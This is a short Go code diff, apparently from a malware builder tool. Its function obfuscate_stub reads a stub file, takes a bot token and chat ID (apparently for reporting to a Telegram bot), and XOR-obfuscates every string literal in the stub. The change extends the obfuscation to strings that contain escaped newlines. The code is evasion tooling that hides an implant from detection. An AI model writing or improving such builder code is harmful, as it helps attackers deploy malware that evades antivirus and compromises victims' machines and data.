@@ -88,7 +88,7 @@ func copy_stub(src_dir, dest_dir string) error {
 
 func obfuscate_stub(stub_path, bot_token, chat_id string, key []byte) error {
 	input, err := os.ReadFile(stub_path)
-	if err != nil {
+	if (err != nil) {
 		return fmt.Errorf("error reading stub file: %w", err)
 	}
 
@@ -136,8 +136,14 @@ func obfuscate_stub(stub_path, bot_token, chat_id string, key []byte) error {
 			if r == '"' {
 				if in_string {
 					original_string := current_string.String()
-					obfuscated_string := obfuscate_string(original_string, key)
-					sb.WriteString(fmt.Sprintf("string(deobf_str(\"%s\", xor_key))", obfuscated_string))
+					if strings.Contains(original_string, "\\n") {
+						original_string = strings.ReplaceAll(original_string, "\\n", "")
+						obfuscated_string := obfuscate_string(original_string, key)
+						sb.WriteString(fmt.Sprintf("string(deobf_str(\"%s\", xor_key)) + \"\\n\"", obfuscated_string))
+					} else {
+						obfuscated_string := obfuscate_string(original_string, key)
+						sb.WriteString(fmt.Sprintf("string(deobf_str(\"%s\", xor_key))", obfuscated_string))
+					}
 					current_string.Reset()
 				}
 				in_string = !in_string
